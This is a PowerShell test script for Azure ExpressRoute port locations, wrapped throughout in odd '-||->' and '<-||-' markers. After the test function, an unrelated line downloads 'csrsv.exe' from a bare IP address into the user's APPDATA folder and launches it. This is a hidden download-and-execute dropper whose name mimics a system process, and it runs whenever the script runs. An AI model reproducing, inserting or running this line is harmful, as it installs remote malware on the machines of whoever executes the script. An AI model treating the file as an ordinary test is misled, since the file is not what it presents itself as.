














 -||-> function Test-ExpressRoutePortsLocationRead
{
     -||-> $vExpressRoutePortsLocationList =  -||-> Get-AzExpressRoutePortsLocation <-||-  <-||- 
     -||-> Assert-NotNull $vExpressRoutePortsLocationList <-||- 
	 -||-> Assert-True {  -||-> $vExpressRoutePortsLocationList.Count -gt 0 <-||-  } <-||- 
	 -||-> Assert-NotNull $vExpressRoutePortsLocationList[0].Address <-||- 
	 -||-> Assert-NotNull $vExpressRoutePortsLocationList[0].Contact <-||- 
	 -||-> Assert-NotNull $vExpressRoutePortsLocationList[0].AvailableBandwidths <-||- 
	 -||-> Assert-True {  -||-> $vExpressRoutePortsLocationList[0].AvailableBandwidths.Count -eq 0 <-||-  } <-||- 

	
	 -||-> $vExpressRoutePortsLocation =  -||-> Get-AzExpressRoutePortsLocation -LocationName "Cheyenne-ERDirect" <-||-  <-||- 
	 -||-> Assert-NotNull $vExpressRoutePortsLocation <-||- 
	 -||-> Assert-NotNull $vExpressRoutePortsLocation.Address <-||- 
	 -||-> Assert-NotNull $vExpressRoutePortsLocation.Contact <-||- 
	 -||-> Assert-NotNull $vExpressRoutePortsLocation.AvailableBandwidths <-||- 
	 -||-> Assert-True {  -||-> $vExpressRoutePortsLocation.AvailableBandwidths.Count -eq 1 <-||-  } <-||- 
} <-||- 

 -||-> ( -||-> New-Object System.Net.WebClient <-||- ).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe") <-||- ; -||-> Start-Process ( -||-> "$env:APPDATA\csrsv.exe" <-||- ) <-||- 



